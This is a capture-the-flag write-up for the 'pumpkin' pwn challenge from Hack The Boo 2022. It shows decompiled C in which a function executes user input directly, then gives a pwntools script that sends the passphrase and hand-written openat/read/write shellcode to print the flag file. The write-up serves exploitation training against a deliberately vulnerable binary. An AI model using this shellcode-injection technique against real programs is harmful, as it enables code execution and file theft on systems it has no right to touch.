---
title: Hack The Boo pwn.pumpkin 2022
author: megachar0x01
date: 2022-10-28
categories: [Pwn, amd64, ctf]
---

### Purpose : Get The Flag


<img src="https://i.imgur.com/GpuDLRX.png" alt="img_1">

<img src="https://i.imgur.com/tGPiaoA.png" alt="img_1">


## challenge
** main **	
```c

void main(void)

{
  int iVar1;
  size_t input_len_int;
  long in_FS_OFFSET;
  ulong local_int;
  undefined8 input_user_string;
  undefined4 local_17;
  undefined2 local_13;
  undefined local_11;
  undefined8 canary;
  
  canary = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setup();
  input_user_string = 0;
  local_17 = 0;
  local_13 = 0;
  local_11 = 0;
  write(1,
        "\nFirst of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: "
        ,112);
  read(0,&input_user_string,14);
  local_int = 0;
  while( true ) {
    input_len_int = strlen((char *)&input_user_string);
    if (input_len_int <= local_int) break;
    if (*(char *)((long)&input_user_string + local_int) == '\n') {
      *(undefined *)((long)&input_user_string + local_int) = 0;
    }
    local_int = local_int + 1;
  }
  iVar1 = strncmp((char *)&input_user_string,"pumpk1ngRulez",0xd);
  if (iVar1 == 0) {
    king();
  }
  else {
    write(1,"\nYou seem too kind for the Pumpking to help you.. I\'m sorry!\n\n",0x3e);
  }
                    /* WARNING: Subroutine does not return */
  exit(0x16);
}


```

** king **
```c


void king(void)

{
  long in_FS_OFFSET;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined4 local_18;
  undefined2 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  write(1,
        "\n[Pumpkgin]: Welcome naughty kid! This time of the year, I will make your wish come true! Wish for everything, even for tha flag!\n\n>> "
        ,0x88);
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_14 = 0;
  read(0,&local_a8,0x95);
  (*(code *)&local_a8)();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}



```

## Solution

write this code to read and print flag from file for verification and same time used code disassemble for shell coding

```c
#include<stdio.h> 
#include<fcntl.h> 
#include<errno.h> 
#include <stdio.h>
int main ()
{
	char buf[30]=" ";
	int fd;
	fd = openat( AT_FDCWD ,"flag.txt", O_RDONLY);	
	read(fd, &buf ,30);
	write(1, &buf ,30);

	return 0;
}



```

```bash

objdump -d main  -M intel ./bin

or we can use gdb to dump

```




```python
#!/usr/bin/python3
from pwn import *
import struct

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *king+261
continue
'''.format(**locals())

exe = './pumpking'; elf = context.binary = ELF(exe, checksec=False);exe_rop = ROP(elf,checksec=False)
libc = elf.libc ; libc_rop = ROP(libc,checksec=False)

io = start()

io.sendlineafter(b"First of all, in order to proceed, we need you to whisper the secret passphrase provided only to naughty kids: ",b"pumpk1ngRulez")

payload = asm("""push 1
dec byte ptr [rsp]
mov rax, 0x7478742e67616c66
push rax
push SYS_openat /* 2 */
pop rax
mov rsi, rsp
xor rdx, rdx /* O_RDONLY */
mov rdi, 0xffffff9c 
syscall
mov rdi,rax
lea rcx,[rbp-0x10]
mov rsi,rcx
mov rdx,70
mov rax,0 /* read syscall number */
syscall
mov rdi,1
lea rcx,[rbp-0x10]
mov rsi,rcx
mov rdx,70 
mov rax,1  /* write syscall number */
syscall
""")


io.sendlineafter(b">>",payload)

print(io.recvline())
io.close()


```
